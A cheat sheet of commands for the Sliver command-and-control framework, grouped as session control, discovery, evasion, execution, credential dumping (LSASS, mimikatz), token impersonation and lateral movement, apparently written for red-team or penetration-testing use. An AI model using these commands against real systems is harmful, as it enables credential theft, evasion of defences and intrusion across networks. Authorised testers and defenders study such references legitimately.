Sliver Cheat Sheet
```bash
### SESSION & BEACON MGT ###
sessions              # List all interactive sessions
beacons               # List all asynchronous beacons
use [id]              # Interact with a specific session or beacon
background            # Background the current session/beacon (Ctrl+Z)
sleep [sec] [jit]     # Change beacon check-in interval and jitter
interactive           # Convert an asynchronous beacon into an interactive session
info                  # Display detailed information about the current implant
kill                  # Terminate the current implant process

### DISCOVERY & FILE SYSTEM ###
ls [path]             # List directory contents
pwd                   # Print current working directory
cd [path]             # Change directory
upload [loc] [rem]    # Upload a file from your machine to the target
download [rem] [loc]  # Download a file from the target to your machine
ps                    # List running processes and their PIDs
netstat               # Display network connections on the target
portscan [ip] [ports] # Run a TCP port scan from the implant

### OPSEC & EVASION ###
migrate [pid]         # Inject and migrate the implant into another process
spawnto [path]        # Set the sacrificial binary used for child processes
blockdlls [on|off]    # Block non-Microsoft DLLs from loading in child processes
terminate [pid]       # Kill a specific process on the target

### EXTENSIONS & ARMORY (Crucial for Post-Ex) ###
armory                # List available tools, BOFs, and .NET assemblies in the Armory
armory install [pkg]  # Install a package (e.g., powerview, rubeus, seatbelt)
extensions load [ext] # Load a specific extension into the current session

### EXECUTION ###
execute [cmd]         # Run a binary on disk directly (bypasses cmd.exe)
shell                 # Open an interactive system shell (Bad OPSEC, leaves artifacts)
execute-assembly [exe]# Execute a compiled .NET assembly entirely in memory
sideload [loc.dll]    # Inject and run a local DLL in a remote process
[bof_name] [args]     # Execute a BOF directly (once installed via Armory)

### CREDENTIAL ACCESS ###
getsystem             # Attempt to elevate to NT AUTHORITY\SYSTEM (via named pipe impersonation)
procdump [pid]        # Dump process memory to your local machine (e.g., for lsass offline)
mimikatz [args]       # Execute Mimikatz commands (Requires installing via Armory)
nanodump              # Dump LSASS memory stealthily (Requires installing via Armory)

### USER IMPERSONATION & TOKENS ###
make-token [dom\usr]  # Create a token with credentials for network auth (PTH)
impersonate [user]    # Impersonate a logged-on user via token manipulation
getuid                # Show the current user and active token context
rev2self              # Revert to the implant's original execution context

### LATERAL MOVEMENT & PIVOTING ###
portfwd add [loc] [rem] # Create a port forward mapping through the implant
socks5 start          # Start a SOCKS5 proxy server routed through the implant
psexec [args]         # Execute via PsExec (Requires installing alias/extension via Armory)
wmi [args]            # Execute commands via WMI (Requires installing alias/extension via Armory)
```